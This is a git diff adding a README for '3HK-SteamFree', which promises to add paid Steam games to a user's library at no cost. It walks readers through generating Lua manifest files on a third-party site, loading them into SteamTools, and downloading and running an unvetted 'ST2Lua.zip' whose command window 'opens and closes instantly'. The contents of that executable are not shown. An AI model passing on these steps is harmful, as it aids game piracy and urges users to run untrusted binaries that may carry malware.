@@ -1,2 +1,30 @@
-# 3HK-Steam-free-Games
-3HK-Steam-free-Games
+# 3HK-SteamFree | Auto Add Free Games to Your Account
+&nbsp;&nbsp;&nbsp;&nbsp; Welcome to the Free Games Store — your ultimate destination to download your favorite games without spending a Dh!
+ ## ☑️ Install
+&nbsp;&nbsp;&nbsp;&nbsp; We rely on **three primary** sources to get free games directly added to your steam account.
+1. First, download the tool called SteamTools from their official website
+(or you can find the direct link below this section).
+ ### &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  [SteamTools](https://www.steamtools.net/)
+2. The next steps will guide you through how to connect your account, claim free games, and automate the entire process using the tool.<br>
+*__🎥 Watch the video below for a step-by-step tutorial__*
+
+ ## 📋 Guide
+1. Go to Steam and copy the name of the game you want.
+2. .Open [SteamDB](https://steamdb.info/) and paste the game name into the search bar.
+3. Copy the game's **App ID**.
+4. Head to [Lua Generator](https://cysaw.org/) and paste the **App ID** to generate the game’s Lua file.
+5. After downloading and opening **the generated Lua file**, drag all files except *__readme.txt__* into the main program **SteamTools**.
+6. Restart **Steam** from within **SteamTools**, as shown in the tutorial video.
+
+## 🧩 File Format: .st
+```
+⚠️ Note: Some games may be in .st format instead of .lua,
+  which might prevent them from appearing in your Steam library right away.
+```
+To fix this:
+1. Drag the **.st** files as-is into the program.
+2. Download and run [ST2Lua.zip](https://github.com/user-attachments/files/21120158/ST2Lua.zip) — the cmd will open and close instantly.
+3. Open your **Steam account**, and you should now see the game in your _library_.
+4. That’s it — enjoy your games!
+
+_All credits go to CySaw’s manifest._
